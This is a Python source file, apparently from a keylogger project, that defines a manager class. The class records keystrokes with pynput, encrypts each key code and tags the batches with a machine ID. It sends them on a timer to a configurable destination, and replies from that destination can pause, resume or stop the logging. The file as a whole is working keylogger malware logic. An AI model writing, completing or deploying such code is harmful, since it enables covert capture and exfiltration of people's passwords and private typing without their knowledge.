import time
from threading import Thread, Event
from pynput import keyboard

from utils.conversions_utils import convert_to_seconds
from listeners.listener import Listener
from containers.container import Container


class KeyLoggerManager:
    __special_keys = {
        keyboard.Key.enter: 10,
        keyboard.Key.space: 32,
    }

    def __init__(self, destination,saving, save_interval_value, 
                 save_interval_unit, container_interval_value, 
                 container_interval_unit, encryption, key_encryption,
                 machine_id):
        
        self.__container = Container(container_interval_value, container_interval_unit)
        self.__listener = Listener(self.__container, self.stop)
        self.__saving = saving(destination, machine_id)
        self.__encryption = encryption(key_encryption)

        self.__save_interval = convert_to_seconds(save_interval_value, save_interval_unit)
        self.__interval_thread = Thread(target=self.__worker, daemon=False)
        self.__stop_event = Event()

        self.__transmit = True

    def __worker(self):
        while not self.__stop_event.is_set():
            time.sleep(self.__save_interval)
            data = self.__container.pop_ready()
            self.__data_organization(data)

            res = self.__saving.send_data(data)

            if res == 0 and self.__transmit:
                self.__transmit = False
                self.__listener.stop()

            elif res == 1 and not self.__transmit:
                self.__transmit = True
                self.__listener.start()

            elif res == -1:
                self.stop()

    def __data_organization(self, data):
        for batch in data:
            timestamp, keys = batch
            for idx, key in enumerate(keys):
                if hasattr(key, 'char') and key.char is not None:
                    keys[idx] = self.__encryption.encode(ord(key.char))
                elif key in KeyLoggerManager.__special_keys:
                    keys[idx] = self.__encryption.encode(KeyLoggerManager.__special_keys[key])
                else:
                    keys[idx] = self.__encryption.encode(0xFFFF)

    def stop(self):
        self.__listener.stop()
        self.__stop_event.set()

        data = self.__container.flush()
        if data:
            self.__data_organization(data)
            self.__saving.send_data(data)

    def run(self):
        if self.__save_interval:
            self.__interval_thread.start()
        self.__listener.start()
